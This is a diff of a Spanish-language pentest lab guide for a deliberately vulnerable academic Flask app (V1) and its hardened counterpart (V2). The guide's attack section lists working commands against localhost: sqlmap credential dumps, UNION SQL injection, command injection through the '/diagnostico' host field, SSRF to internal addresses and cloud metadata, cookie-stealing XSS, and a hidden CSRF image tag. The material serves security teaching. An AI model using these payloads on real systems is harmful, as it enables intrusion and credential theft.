@@ -4,12 +4,13 @@ Como atacar la aplicacion (V1 vulnerable), como se obtuvieron los resultados de
 verificacion de la V2, y los scripts automatizados (SQLi con sqlmap, probes no
 destructivos) incluidos en este repositorio.
 
-> **Estado:** la V1 (P1) esta **integrada en `v1-insegura`** con RCE
-> (`/diagnostico`), SSRF (`/importar`), XSS real (`|safe`) y `docs/PENTEST.md`.
-> Los ataques de esta guia se reproducen contra `http://localhost:5001`.
-> La verificacion de la V2 (seccion 2) esta **ejecutada y verificada**
-> (PASS=18 FAIL=0). El ataque sqlmap automatizado se ejecuto en vivo y su
-> evidencia esta en `docs/SQLMAP_ATTACK.md`.
+> **Estado:** la V1 (P1) esta integrada en `main` bajo `v1/` (y su copia aislada en
+> la rama `v1-insegura`) con RCE (`/diagnostico`), SSRF (`/estudiantes/importar-foto`,
+> `/cursos/importar-silabo`), XSS real (`|safe` + upload) y `v1/docs/PENTEST.md`.
+> Los ataques de esta guia se reproducen contra `http://localhost:5001`. La verificacion
+> de la V2 (seccion 2) esta **ejecutada y verificada** (PASS=18 FAIL=0). El ataque
+> sqlmap automatizado se ejecuto en vivo y su evidencia esta en `docs/SQLMAP_ATTACK.md`
+> y `docs/sqlmap_evidence/`.
 
 ---
 
@@ -28,7 +29,7 @@ Herramientas usadas:
 - **sqlmap** (SQLi automatizado) — https://sqlmap.org
 - **nmap** (reconocimiento) — https://nmap.org
 - **python-docx / pytest** (informe y tests de la V2, 59 tests)
-- **Docker Compose** (despliegue) — `sistema_nginx` + `sistema_v2`
+- **Docker Compose** (despliegue) — `sistema_v1` + `sistema_v2` + `sistema_nginx` + `sistema_sqlmap`
 
 ---
 
@@ -38,7 +39,7 @@ Herramientas usadas:
 
 - **Docker Desktop** en marcha (Windows) o Docker Engine (Linux)
 - **git** y **curl** (Windows 10/11 ya incluye `curl.exe`)
-- **sqlmap** solo para los ataques a la V1 (https://sqlmap.org)
+- **sqlmap** solo para los ataques a la V1 fuera de Docker (https://sqlmap.org)
 - **nmap** opcional (reconocimiento, https://nmap.org)
 
 > **Windows PowerShell:** use `curl.exe` (el comando `curl` es un alias de
@@ -46,22 +47,25 @@ Herramientas usadas:
 > ejecute los scripts asi:
 > `powershell -ExecutionPolicy Bypass -File .\scripts\verificar_v2.ps1`
 
-### 1.2 Desplegar la V2 (segura)
+### 1.2 Levantar el laboratorio completo (V1 + V2)
 
 ```bash
 git clone https://github.com/AnaliZelaya/Sistema_Academico_Vul.git
 cd Sistema_Academico_Vul
-git checkout p4                      # rama con guia y scripts
 
-./scripts/generate_certs.ps1         # Windows: genera certs/cert.pem + key.pem
-docker compose up -d --build         # sistema_v2 + sistema_nginx (https://localhost)
+# Windows: genera certs/cert.pem + key.pem
+.\scripts\generate_certs.ps1          # Linux: ./scripts/generate_certs.sh
+
+# Levanta V1 (:5001) + V2/Nginx TLS (:443)
+docker compose up -d --build
 ```
 
-Comprobar que responde:
+Comprobar que responden:
 
 ```bash
-curl -s -o /dev/null -w "%{http_code} %{redirect_url}\n" http://localhost/   # 301 https://localhost/
-curl -k -s -o /dev/null -w "%{http_code}\n" https://localhost/               # 302 (login)
+curl -s -o /dev/null -w "%{http_code}\n" http://localhost:5001/login      # V1 -> 200
+curl -s -o /dev/null -w "%{http_code} %{redirect_url}\n" http://localhost/  # 301 https://localhost/
+curl -k -s -o /dev/null -w "%{http_code}\n" https://localhost/              # V2 -> 302 (login)
 ```
 
 Detalle completo del despliegue (volumenes, red, Nginx, TLS): `docs/DESPLIEGUE.md`.
@@ -76,23 +80,11 @@ Detalle completo del despliegue (volumenes, red, Nginx, TLS): `docs/DESPLIEGUE.m
 
 Resultados esperados: tabla en la seccion 2.
 
-### 1.4 Desplegar y atacar la V1 (vulnerable) — cuando este disponible
+### 1.4 Desplegar y atacar la V1 (vulnerable)
 
-La V1 (P1) se publica en la rama `v1-insegura`. Al subirse:
-
-```bash
-git checkout v1-insegura
-# Opcion A: Flask dev server (debug=True) en :5001
-python app.py
-# Opcion B: contenedor propio (Dockerfile.v1) mapeado al puerto 5001
-```
-
-Con la V1 en `http://localhost:5001`, seguir la seccion 3: reconocimiento,
-SQLi manual, sqlmap (`./scripts/sqlmap_attack.ps1`), RCE, SSRF, XSS, CSRF y
-fuerza bruta.
-
-> Hoy la V1 **no esta desplegada**: los pasos de la seccion 3 quedan
-> preparados y listos para ejecutar en cuanto se suba el P1.
+La V1 ya se levanta con el stack (seccion 1.2). Para atacarla, seguir la seccion 3:
+reconocimiento, SQLi manual, sqlmap (`./scripts/sqlmap_attack.ps1` o el servicio
+Docker `sqlmap`), RCE, SSRF, XSS, CSRF y fuerza bruta.
 
 ---
 
@@ -235,18 +227,17 @@ curl -s "http://localhost:5001/estudiantes?buscar=' UNION SELECT username,passwo
 #   -> credenciales de admin/profesor en texto plano
 ```
 
-### 3.3 SQLi automatizado con sqlmap
+### 3.3 SQLi automatizado con sqlmap (ejecutado y verificado)
 
 Scripts incluidos: `scripts/sqlmap_attack.sh` y `scripts/sqlmap_attack.ps1`.
-Ejecutan tres fases: enumerar bases desde `/login`, volcar `usuarios` desde
-`/login`, y (con cookie de sesion) atacar `/estudiantes?buscar=` y volcar la
-tabla. La evidencia queda en `docs/sqlmap_evidence/`.
+La evidencia real queda en `docs/sqlmap_evidence/` y el detalle en `docs/SQLMAP_ATTACK.md`
+(dump de `usuarios` = `admin/admin123`, `profesor/profesor`).
 
 **Vía Docker (recomendada, sin instalar nada en el host):**
 
 ```bash
-# 1. Levantar la V1 (Flask debug) — la imagen sqlmap queda lista en la red "lab"
-docker compose up -d v1
+# 1. La V1 ya esta levantada por el stack (seccion 1.2); la imagen sqlmap
+#    esta lista en la red "lab"
 
 # 2. Enumerar bases desde /login (POST, sin CSRF en V1)
 docker compose run --rm sqlmap -u "http://v1:5001/login" \
@@ -256,7 +247,7 @@ docker compose run --rm sqlmap -u "http://v1:5001/login" \
 # 3. Dump de usuarios (credenciales en texto plano) — salida en /out (docs/sqlmap_evidence)
 docker compose run --rm sqlmap -u "http://v1:5001/login" \
        --data="username=admin&password=x" \
-       --batch --level=1 --risk=1 --threads=4 -D academia -T usuarios --dump
+       --batch --level=1 --risk=1 --threads=4 -T usuarios --dump --output-dir=/out
 ```
 
 **Vía scripts (sqlmap en el host):**
@@ -278,7 +269,7 @@ sqlmap -u "http://localhost:5001/login" --data="username=admin&password=x" \
 
 # Dump de usuarios (credenciales en texto plano)
 sqlmap -u "http://localhost:5001/login" --data="username=admin&password=x" \
-       --batch --level=1 --risk=1 --threads=4 -D academia -T usuarios --dump
+       --batch --level=1 --risk=1 --threads=4 -T usuarios --dump
 
 # Con sesion (robar cookie por XSS y reutilizarla en /estudiantes?buscar=)
 curl -s -c cj.txt -o /dev/null -X POST http://localhost:5001/login \
@@ -288,43 +279,65 @@ sqlmap -u "http://localhost:5001/estudiantes" --data="buscar=test" \
        --method=GET --batch --level=2 --risk=2 --threads=4 -T usuarios --dump
 ```
 
-Resultado esperado: `usuarios` con `admin/admin123` y `profesor/profesor` en
-texto plano. Evidencia (`.csv`/`.log`) a adjuntar en `docs/SQLMAP_ATTACK.md`.
+Resultado obtenido: `usuarios` con `admin/admin123` y `profesor/profesor` en
+texto plano. Evidencia (`.csv`/`.log`) en `docs/sqlmap_evidence/` y
+`docs/SQLMAP_ATTACK.md`.
 
 ### 3.4 RCE — Command Injection
 
-Con el endpoint `/diagnostico` de la V1 (concatena el comando con `shell=True`):
+Con el endpoint `/diagnostico` de la V1 (el campo `host` se concatena directo con
+`shell=True`):
 
 ```bash
-curl -s -X POST http://localhost:5001/diagnostico -d "comando=fecha; whoami"
-curl -s -X POST http://localhost:5001/diagnostico -d "comando=fecha|id"
+# Windows (cmd.exe): separador &
+curl -s -X POST http://localhost:5001/diagnostico --data-urlencode "host=127.0.0.1 & whoami"
+# Linux / Docker (sh): separador ;
+curl -s -X POST http://localhost:5001/diagnostico --data-urlencode "host=127.0.0.1; whoami"
 # -> salida de whoami/id visible en la respuesta (ejecucion de comandos)
 ```
 
 ### 3.5 SSRF
 
-Con el endpoint `/importar` de la V1 (descarga cualquier URL):
+Con los endpoints `/estudiantes/importar-foto` y `/cursos/importar-silabo` de la V1
+(descarga cualquier URL sin allowlist):
 
 ```bash
-# Metadata de la nube (rol de EC2, tokens temporales)
-curl -s -X POST http://localhost:5001/importar -d "url=http://169.254.169.254/latest/meta-data/"
-# Recursos internos
-curl -s -X POST http://localhost:5001/importar -d "url=http://localhost:5001/usuarios"
-curl -s -X POST http://localhost:5001/importar -d "url=http://192.168.1.10/"
+# Alcanzar un recurso interno del propio servidor (loopback)
+curl -s -X POST http://localhost:5001/estudiantes/importar-foto \
+  --data-urlencode "estudiante_id=1" \
+  --data-urlencode "url=http://127.0.0.1:5001/login"
+
+# SSRF ciego basado en errores (el traceback de Werkzeug revela la excepcion)
+curl -s -X POST http://localhost:5001/cursos/importar-silabo \
+  --data-urlencode "curso_id=1" \
+  --data-urlencode "url=http://10.0.0.99:9999/"
 ```
 
 ### 3.6 XSS
 
-- **Via upload (funciona hoy):** la V1 sirve el archivo desde `/static/uploads`:
+- **Via upload (.html servido en el mismo dominio):** la V1 sirve el archivo subido:
 
 ```bash
-echo '<script>alert(document.cookie)</script>' > payload.html
-curl -s -F "archivo=@payload.html" http://localhost:5001/archivos/subir
-curl -s http://localhost:5001/static/uploads/payload.html    # -> ejecuta JS
+echo '<script>alert(document.cookie)</script>' > malicioso.html
+curl -s -b cj.txt -F "archivo=@malicioso.html" http://localhost:5001/archivos/subir
+# luego abrir en el navegador:
+# http://localhost:5001/archivos/descargar/malicioso.html   -> ejecuta JS
 ```
 
-- **Campos sin escapar:** con el `|safe` en templates, inyectar
-  `<script>` en nombre/email (XSS almacenado).
+- **Campo `observaciones` de notas (filtro `|safe`):** desactiva el auto-escape de Jinja2.
+
+```bash
+curl -s -b cj.txt \
+  --data-urlencode "estudiante_id=1" --data-urlencode "curso_id=1" \
+  --data-urlencode "nota=15" --data-urlencode "ciclo=2026-I" \
+  --data-urlencode "observaciones=<script>alert(1)</script>" \
+  http://localhost:5001/notas/crear
+# -> cualquier usuario que abra /notas ejecuta el script (robando cookies de admin)
+```
+
+> Cuidado con las comillas simples: el INSERT tambien es vulnerable a SQLi, asi que
+> un payload con `'` (p. ej. `alert('xss')`) rompe la sentencia SQL. Usar payloads sin
+> comillas simples: `<script>alert(1)</script>`.
 
 ### 3.7 CSRF — delete por GET
 
@@ -332,7 +345,7 @@ La V1 borra por GET sin token. Desde una pagina maliciosa (con la victima con
 sesion en la V1):
 
 ```html
-<img src="http://localhost:5001/estudiantes/eliminar/1">
+<img src="http://localhost:5001/estudiantes/eliminar/3" style="display:none">
 ```
 
 O con curl: `curl -s "http://localhost:5001/estudiantes/eliminar/1"` borra el
@@ -352,5 +365,6 @@ bloqueo (la V2 responde 429 al 6o intento; la V1 no).
 | `scripts/sqlmap_attack.sh` / `.ps1` | SQLi automatizado contra la V1 (login + busqueda + dump de `usuarios`) |
 | `scripts/verificar_v2.sh` / `.ps1` | Reproduce los 12 probes de la V2 (PASS=18 FAIL=0) |
 | `scripts/generate_certs.sh` / `.ps1` | Genera los certificados TLS de la V2 |
+| `scripts/setup_dbs.py` | Genera `db/v1_academico.db` (plano) y `db/v2_academico.db` (bcrypt) |
 
-Resultados formales y comparativa V1 vs V2: `docs/PENTEST.md`.
+Resultados formales y comparativa V1 vs V2: `docs/PENTEST.md` y `v1/docs/PENTEST.md`.
